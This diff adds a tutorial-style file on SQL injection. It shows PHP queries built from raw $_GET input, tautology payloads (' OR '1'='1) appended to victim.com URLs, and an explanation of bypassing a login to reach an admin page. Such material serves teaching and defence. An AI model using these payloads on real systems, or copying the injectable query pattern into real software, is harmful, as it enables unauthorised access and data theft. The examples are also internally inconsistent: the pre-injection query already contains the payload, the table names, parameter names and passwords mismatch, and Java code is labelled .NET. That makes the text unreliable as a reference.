@@ -1,0 +1,67 @@
+========================== Example 1 ===============================
+
+// php code : 
+$query = "SELECT * FROM Products WHERE Price < '$_GET["val"]' ORDER BY ProductDescription";
+
+// SQL Before Injection :
+SELECT *
+FROM ProductsTbl
+WHERE Price < '100.00' OR '1'='1'
+ORDER BY ProductDescription;
+
+// Injection Dork:
+‘ OR ‘1’= ‘1
+
+// Attempt to inject ower own SQL commands byappending them to the input parameter val
+// The appended statement results in the OR operand of the query always returning true
+http://www.victim.com/products.php?val=100’ OR ‘1’=’1
+
+// SQL query after Injection :
+SELECT *
+FROM ProductsTbl
+WHERE Price < '100.00' OR '1'='1'
+ORDER BY ProductDescription;
+
+
+
+========================== Example 2 ===============================
+// PHP Code :
+// dynamically build the sql statement with the input
+$query = "SELECT userid FROM CMSUsers WHERE user = '$_GET["user"]' AND password = '$_GET["password"]'";
+
+//Before Injection :
+SELECT userid
+FROM CMSUsers
+WHERE user = 'foo' AND password = 'bar';
+
+// Injection Dork:
+‘ OR ‘1’= ‘1
+
+//after injection : 
+http://www.victim.com/cms/login.php?username=foo&password=bar’ OR ‘1’=’1
+// All of the userids are returned
+
+// SQL query after Injection :
+SELECT userid
+FROM CMSUsers
+WHERE user = 'foo' AND password = 'password' OR '1'='1';
+
+The logic of the application means that if the database returns more than zero records,
+we must have entered the correct authentication credentials and should be redirected and
+given access to the protected admin.php script. We will normally be logged in as the first
+user in the CMSUsers table. An SQL injection vulnerability has allowed the application logic
+to be manipulated and subverted.
+
+===========================   Understanding How It Happens   ====================================
+
+I. Dynamic String Building :
+----------------------------
+
+// a dynamically built sql string statement in PHP
+$query = "SELECT * FROM table WHERE field = '$_GET["input"]'";
+
+// a dynamically built sql string statement in .NET
+query = "SELECT * FROM table WHERE field = '" +
+request.getParameter("input") + "'";
+
+
